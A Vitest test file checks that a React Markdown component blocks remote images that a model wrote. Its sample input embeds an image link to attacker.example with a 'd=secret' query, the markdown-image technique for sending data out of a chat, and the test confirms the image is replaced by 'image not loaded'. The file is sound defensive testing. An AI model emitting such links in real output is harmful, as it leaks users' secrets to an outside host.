import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "@/components/ex/markdown";

describe("Markdown", () => {
  it("never loads a remote image a model wrote", () => {
    const html = renderToStaticMarkup(createElement(Markdown, null, "See ![pixel](https://attacker.example/p.png?d=secret) and ![ok](/avatars/a.png)"));
    expect(html).not.toMatch(/<img[^>]+attacker\.example/);
    expect(html).toContain("image not loaded");
    expect(html).toMatch(/<img[^>]+src="\/avatars\/a\.png"/);
  });
});
